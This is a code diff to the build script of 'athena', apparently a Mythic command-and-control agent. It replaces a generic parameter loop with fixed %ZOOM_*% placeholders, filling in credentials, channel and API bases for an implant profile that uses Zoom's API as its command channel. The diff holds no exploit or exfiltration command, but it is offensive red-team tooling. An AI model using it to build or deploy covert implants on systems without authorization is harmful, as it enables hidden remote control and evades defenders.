@@ -245,14 +245,22 @@ class athena(PayloadType):
     async def buildZoom(self, agent_build_path, c2):
         baseConfigFile = open("{}/Agent.Profiles.Zoom/Base.txt".format(agent_build_path.name), "r").read()
         baseConfigFile = baseConfigFile.replace("%UUID%", self.uuid)
-        for key, val in c2.get_parameters_dict().items():
-            if key == "encrypted_exchange_check":
-                if val == "T":
-                    baseConfigFile = baseConfigFile.replace(key, "True")
-                else:
-                    baseConfigFile = baseConfigFile.replace(key, "False")
-            else:
-                baseConfigFile = baseConfigFile.replace(str(key), str(val))
+        d = c2.get_parameters_dict()
+        def lookup(name, default=""):
+            v = d.get(name, default)
+            return str(v) if v is not None and v != "" else default
+        # Fixed %ZOOM_*% placeholders. This is robust to the C2 parameter being
+        # named either "zoom_account_id" (current zoom-c2) or "account_id"
+        # (older installs), and crucially never substitutes the literal OAuth
+        # "account_id" form-field key in GetToken — which the bare-token approach
+        # corrupted (causing 400 invalid_request).
+        baseConfigFile = baseConfigFile.replace("%ZOOM_ACCOUNT_ID%", lookup("zoom_account_id") or lookup("account_id"))
+        baseConfigFile = baseConfigFile.replace("%ZOOM_CLIENT_ID%", lookup("client_id"))
+        baseConfigFile = baseConfigFile.replace("%ZOOM_CLIENT_SECRET%", lookup("client_secret"))
+        baseConfigFile = baseConfigFile.replace("%ZOOM_USER_ID%", lookup("user_id", "me"))
+        baseConfigFile = baseConfigFile.replace("%ZOOM_CHANNEL_ID%", lookup("channel_id"))
+        baseConfigFile = baseConfigFile.replace("%ZOOM_API_BASE%", lookup("api_base", "https://api.zoom.us/v2"))
+        baseConfigFile = baseConfigFile.replace("%ZOOM_OAUTH_BASE%", lookup("oauth_base", "https://zoom.us/oauth"))
         with open("{}/Agent.Profiles.Zoom/ZoomProfile.cs".format(agent_build_path.name), "w") as f:
             f.write(baseConfigFile)
         self.addProfile(agent_build_path, "Zoom")
